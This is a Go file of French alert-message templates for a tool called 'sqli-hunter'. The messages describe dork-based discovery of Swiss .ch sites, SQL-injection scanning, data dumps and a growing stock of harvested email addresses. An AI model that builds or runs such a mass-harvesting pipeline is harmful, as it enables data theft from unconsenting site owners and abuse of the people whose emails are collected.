package alert

import (
	"fmt"

	"github.com/sqli-hunter/sqli-hunter/internal/models"
)

var fr = Texts{
	TitleDailyLaunch:   "Daily lancé",
	TitleWeeklyLaunch:  "Weekly lancé",
	TitleMonthlyLaunch: "Monthly lancé",
	TitleScanComplete:  "Scan terminé",
	TitleDailyComplete: "Daily terminé",

	Launch:       frLaunch,
	DiscoverDone: frDiscoverDone,
	ScanStarted:  frScanStarted,
	Vuln:         frVuln,
	DumpFail:     frDumpFail,
	DumpOK:       frDumpOK,
	Complete:     frComplete,
	Error:        frError,
	StockSummary: frStockSummary,
	DailyLaunch:  frDailyLaunch,
	BigLaunch:    frBigLaunch,
	DailyNoNew:   frDailyNoNew,
	DiscoverProgress: frDiscoverProgress,
	ScanProgress: frScanProgress,
}

func frLaunch(title, detail string) string {
	return "🚀 " + title + "\n" + detail
}

func frDiscoverDone(kept, skipped, fetched int) string {
	return fmt.Sprintf("🔎 Discover terminé\nURLs gardées: %d\nignorées: %d\nlues: %d", kept, skipped, fetched)
}

func frScanStarted(urlCount int, listFile string) string {
	return fmt.Sprintf("▶️ Scan lancé\nurls: %d\nfichier: %s", urlCount, listFile)
}

func frVuln(f models.Finding) string {
	return "🔴 VULN " + string(f.VulnType) + "\n" + formatFinding(f)
}

func frDumpFail(f models.Finding, reason string) string {
	return "⚠️ Dump impossible\n" + formatFinding(f) + "\nraison: " + reason
}

func frDumpOK(d models.ExtractedData, email string) string {
	return "✅ Dump OK\n" + formatDumpDetail(d, email)
}

func frComplete(title, detail string) string {
	return "🏁 " + title + "\n" + detail
}

func frError(msg string) string {
	return "❌ " + msg
}

func frStockSummary(baseDir string) string {
	return stockLines(baseDir, "stock emails:", "• %s — %d", "stock emails: vide")
}

func frDailyLaunch(limit, threads int, outputDir string) string {
	return launchDetail(limit, threads, outputDir, "🇨🇭 Suisse (.ch) · OpenSerp")
}

func frBigLaunch(limit, threads int, outputDir string) string {
	return launchDetail(limit, threads, outputDir, "🇨🇭 Max emails .ch · 6525 dorks DBMS")
}

func launchDetail(limit, threads int, outputDir, header string) string {
	lim := "∞"
	if limit > 0 {
		lim = fmt.Sprintf("%d", limit)
	}
	return fmt.Sprintf("%s\n📊 Limite : %s URLs\n⚡ %d threads\n📁 %s/emails/", header, lim, threads, outputDir)
}

func frDailyNoNew(baseDir string) string {
	return "Rien de nouveau\n" + frStockSummary(baseDir)
}

func frDiscoverProgress(phase string, step, total, kept, fetched, skipped int) string {
	if phase == "fresh-pass" && total > 0 {
		return fmt.Sprintf("📊 Discover — %s\n%d/%d dorks\nURLs: %d gardées · %d lues · %d ignorées",
			phase, step, total, kept, fetched, skipped)
	}
	if total > 0 {
		return fmt.Sprintf("📊 Discover — %s\npage %d/%d\nURLs: %d gardées · %d lues · %d ignorées",
			phase, step, total, kept, fetched, skipped)
	}
	return fmt.Sprintf("📊 Discover — %s\npage %d\nURLs: %d gardées · %d lues · %d ignorées",
		phase, step, kept, fetched, skipped)
}

func frScanProgress(scanned, total, vulns, findings int) string {
	return fmt.Sprintf("📊 Scan en cours\n%d/%d URLs · %d vuln · %d findings",
		scanned, total, vulns, findings)
}
